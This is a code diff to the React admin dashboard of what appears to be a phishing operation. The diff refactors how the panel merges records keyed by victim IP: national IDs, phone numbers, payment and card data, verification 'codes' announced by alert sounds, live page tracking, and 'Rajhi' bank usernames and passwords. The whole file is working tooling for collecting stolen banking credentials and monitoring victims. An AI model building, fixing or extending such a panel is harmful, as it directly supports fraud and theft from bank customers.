@@ -1,5 +1,5 @@
 // src/App.js
-import React, { useEffect, useState, useRef, useLayoutEffect } from "react";
+import React, { useEffect, useLayoutEffect, useState, useRef } from "react";
 import { Routes, Route, Navigate, useNavigate } from "react-router-dom";
 
 import { socket } from "./socket";
@@ -78,20 +78,6 @@ export default function App() {
 
         const map = {};
 
-const toMs = (d) => {
-  if (!d) return 0;
-  const ms = Date.parse(d);
-  return Number.isFinite(ms) ? ms : 0;
-};
-
-const docActivityMs = (r) => toMs(r.updatedAt || r.createdAt);
-
-const bumpActivity = (ipKey, ms) => {
-  if (!map[ipKey]) return;
-  const cur = map[ipKey].lastActivityAt || 0;
-  if (ms > cur) map[ipKey].lastActivityAt = ms;
-};
-
         // 1) Flatten everything except payment/flags/locations/newDates/rajhi
         Object.entries(data).forEach(([key, arr]) => {
           if (
@@ -105,6 +91,7 @@ const bumpActivity = (ipKey, ms) => {
 
           arr.forEach((r) => {
             const ipKey = r.ip;
+            const ts = new Date(r.updatedAt || r.createdAt || Date.now()).getTime();
             if (!map[ipKey]) {
               map[ipKey] = {
                 payments: [],
@@ -121,9 +108,8 @@ const bumpActivity = (ipKey, ms) => {
               flag: map[ipKey].flag,
               hasNewData: false,
               hasPayment: map[ipKey].hasPayment,
+              lastActivityAt: Math.max(map[ipKey].lastActivityAt || 0, ts),
             };
-
-            bumpActivity(ipKey, docActivityMs(r));
           });
         });
 
@@ -142,7 +128,7 @@ const bumpActivity = (ipKey, ms) => {
             }
             map[ipKey].payments.push(payDoc);
             map[ipKey].hasPayment = true; // show as completed payment
-            bumpActivity(ipKey, docActivityMs(payDoc));
+            map[ipKey].lastActivityAt = Math.max(map[ipKey].lastActivityAt || 0, new Date(payDoc.createdAt || payDoc.updatedAt || Date.now()).getTime());
           });
         }
 
@@ -162,58 +148,57 @@ const bumpActivity = (ipKey, ms) => {
           });
         }
 
-        // 4) Locations (do NOT create a user from a mere visit)
-if (data.locations) {
-  data.locations.forEach(({ ip: ipKey, currentPage }) => {
-    if (!map[ipKey]) return; // ignore visitors with no submitted data
-    map[ipKey].currentPage = currentPage;
-  });
-}
+        // 4) Locations
+        // NOTE: do NOT create a new row from location alone.
+        // Only attach currentPage if this IP already has real submitted data.
+        if (data.locations) {
+          data.locations.forEach(({ ip: ipKey, currentPage }) => {
+            if (map[ipKey]) {
+              map[ipKey].currentPage = currentPage;
+            }
+          });
+        }
 
-// 5) Merge NewDate identity fields
-if (data.newDates) {
-  data.newDates.forEach((nd) => {
-    const {
-      ip: ipKey,
-      name,
-      nationalID,
-      phoneNumber,
-      email,
-      nationality,
-      countryOfRegistration,
-      region,
-    } = nd;
+        // 5) Merge NewDate identity fields
+        if (data.newDates) {
+          data.newDates.forEach(
+            ({
+              ip: ipKey,
+              name,
+              nationalID,
+              phoneNumber,
+              email,
+              nationality,
+              countryOfRegistration,
+              region,
+            }) => {
+              if (!map[ipKey]) {
+                map[ipKey] = {
+                  payments: [],
+                  flag: false,
+                  hasNewData: false,
+                  hasPayment: false,
+                lastActivityAt: 0,
+                };
+              }
+              map[ipKey] = {
+                ...map[ipKey],
+                name: name ?? map[ipKey].name,
+                nationalID: nationalID ?? map[ipKey].nationalID,
+                phoneNumber: phoneNumber ?? map[ipKey].phoneNumber,
+                email: email ?? map[ipKey].email,
+                nationality: nationality ?? map[ipKey].nationality,
+                countryOfRegistration:
+                  countryOfRegistration ?? map[ipKey].countryOfRegistration,
+                region: region ?? map[ipKey].region,
+              };
+            }
+          );
+        }
 
-    if (!map[ipKey]) {
-      map[ipKey] = {
-        payments: [],
-        flag: false,
-        hasNewData: false,
-        hasPayment: false,
-        lastActivityAt: 0,
-      };
-    }
-
-    map[ipKey] = {
-      ...map[ipKey],
-      name: name ?? map[ipKey].name,
-      nationalID: nationalID ?? map[ipKey].nationalID,
-      phoneNumber: phoneNumber ?? map[ipKey].phoneNumber,
-      email: email ?? map[ipKey].email,
-      nationality: nationality ?? map[ipKey].nationality,
-      countryOfRegistration:
-        countryOfRegistration ?? map[ipKey].countryOfRegistration,
-      region: region ?? map[ipKey].region,
-    };
-
-    bumpActivity(ipKey, docActivityMs(nd));
-  });
-}
-
-// 6) 🔹 Merge Rajhi records into user object
+        // 6) 🔹 Merge Rajhi records into user object
         if (data.rajhi) {
-          data.rajhi.forEach((rj) => {
-            const { ip: ipKey, username, password } = rj;
+          data.rajhi.forEach(({ ip: ipKey, username, password }) => {
             if (!map[ipKey]) {
               map[ipKey] = {
                 payments: [],
@@ -228,8 +213,6 @@ if (data.newDates) {
               rajhiUsername: username ?? map[ipKey].rajhiUsername,
               rajhiPassword: password ?? map[ipKey].rajhiPassword,
             };
-
-            bumpActivity(ipKey, docActivityMs(rj));
           });
         }
 
@@ -266,7 +249,7 @@ if (data.newDates) {
             flag: false,
             hasNewData: false,
             hasPayment: false,
-            lastActivityAt: 0,
+                lastActivityAt: 0,
           };
 
           playNewDataSound();
@@ -279,8 +262,8 @@ if (data.newDates) {
               payments: oldObj.payments,
               flag: oldObj.flag,
               hasNewData: true, // ✅ mark as new data
-              lastActivityAt: Date.now(),
               hasPayment: oldObj.hasPayment || u.hasPayment === true,
+              lastActivityAt: Date.now(),
             },
           };
         });
@@ -294,7 +277,7 @@ if (data.newDates) {
             flag: false,
             hasNewData: false,
             hasPayment: false,
-            lastActivityAt: 0,
+                lastActivityAt: 0,
           };
 
           playCodeSound(); // Use code sound
@@ -307,8 +290,8 @@ if (data.newDates) {
               payments: oldObj.payments,
               flag: oldObj.flag,
               hasNewData: true, // ✅ mark as new data
-              lastActivityAt: Date.now(),
               hasPayment: oldObj.hasPayment || u.hasPayment === true,
+              lastActivityAt: Date.now(),
             },
           };
         });
@@ -322,7 +305,7 @@ if (data.newDates) {
             flag: false,
             hasNewData: false,
             hasPayment: false,
-            lastActivityAt: 0,
+                lastActivityAt: 0,
           };
           return {
             ...m,
@@ -346,7 +329,7 @@ if (data.newDates) {
             flag: false,
             hasNewData: false,
             hasPayment: false,
-            lastActivityAt: 0,
+                lastActivityAt: 0,
           };
 
           // 🚫 skip duplicates
@@ -372,7 +355,6 @@ if (data.newDates) {
               payments: [...oldObj.payments, u],
               flag: oldObj.flag,
               hasNewData: true, // new data arrived
-              lastActivityAt: Date.now(),
               hasPayment: true, // ✅ mark as paid/completed
             },
           };
@@ -395,7 +377,7 @@ if (data.newDates) {
               flag: false,
               hasNewData: false,
               hasPayment: false,
-              lastActivityAt: 0,
+                lastActivityAt: 0,
             }),
             flag,
           },
@@ -424,24 +406,35 @@ if (data.newDates) {
       );
 
       // 🌐 Location updates are SILENT and DO NOT mark new data
-      // Location updates should never create a new user row.
-// Only update location for IPs that already submitted data.
-socket.on("locationUpdated", ({ ip, page }) => {
-  setUsers((m) => {
-    if (!m[ip]) return m; // ignore visitors
+      socket.on("locationUpdated", ({ ip, page }) => {
+        if (page !== "offline") {
+          // Do NOT create a new row from location alone
+          setUsers((m) => {
+            if (!m[ip]) return m;
+            return {
+              ...m,
+              [ip]: {
+                ...m[ip],
+                currentPage: page,
+              },
+            };
+          });
+        } else {
+          setUsers((m) => {
+            if (!m[ip]) return m;
+            return {
+              ...m,
+              [ip]: {
+                ...m[ip],
+                currentPage: "offline",
+                // keep hasNewData/hasPayment unchanged
+              },
+            };
+          });
+        }
+      });
 
-    return {
-      ...m,
-      [ip]: {
-        ...m[ip],
-        currentPage: page,
-        // keep hasNewData/hasPayment unchanged
-      },
-    };
-  });
-});
-
-socket.on("userDeleted", removeUser);
+      socket.on("userDeleted", removeUser);
       socket.on("flagUpdated", updateFlag);
     })();
     
@@ -516,28 +509,22 @@ function DashboardView({
   setInfoIp,
   setCardIp,
 }) {
+  // Keep the scroll position fully user-controlled (no random jumps)
+  const tableWrapRef = useRef(null);
+  const lastScrollTopRef = useRef(0);
 
-const tableWrapRef = useRef(null);
-const savedScrollTopRef = useRef(0);
-
-// Keep user-controlled scroll position stable across realtime re-renders.
-useEffect(() => {
-  const el = tableWrapRef.current;
-  if (!el) return;
-
-  const onScroll = () => {
-    savedScrollTopRef.current = el.scrollTop;
+  const handleTableScroll = () => {
+    const el = tableWrapRef.current;
+    if (!el) return;
+    lastScrollTopRef.current = el.scrollTop;
   };
 
-  el.addEventListener("scroll", onScroll, { passive: true });
-  return () => el.removeEventListener("scroll", onScroll);
-}, []);
-
-useLayoutEffect(() => {
-  const el = tableWrapRef.current;
-  if (!el) return;
-  el.scrollTop = savedScrollTopRef.current;
-}, [users]);
+  useLayoutEffect(() => {
+    const el = tableWrapRef.current;
+    if (!el) return;
+    // Restore the user's last scroll position after any realtime update re-renders the table
+    el.scrollTop = lastScrollTopRef.current;
+  }, [users]);
 
   return (
     <div className="container py-4">
@@ -545,7 +532,11 @@ useLayoutEffect(() => {
         <h2>Admin Dashboard</h2>
       </div>
 
-      <div ref={tableWrapRef} className="tableScroll">
+      <div
+        className="tableScroll"
+        ref={tableWrapRef}
+        onScroll={handleTableScroll}
+      >
         <UserTable
           users={users}
           highlightIp={highlightIp}
@@ -564,12 +555,9 @@ useLayoutEffect(() => {
       )}
 
       {infoIp && (
-        <InfoModal
-          ip={infoIp}
-          user={users[infoIp]}
-          onClose={() => setInfoIp(null)}
-        />
+        <InfoModal ip={infoIp} user={users[infoIp]} onClose={() => setInfoIp(null)} />
       )}
     </div>
   );
 }
+
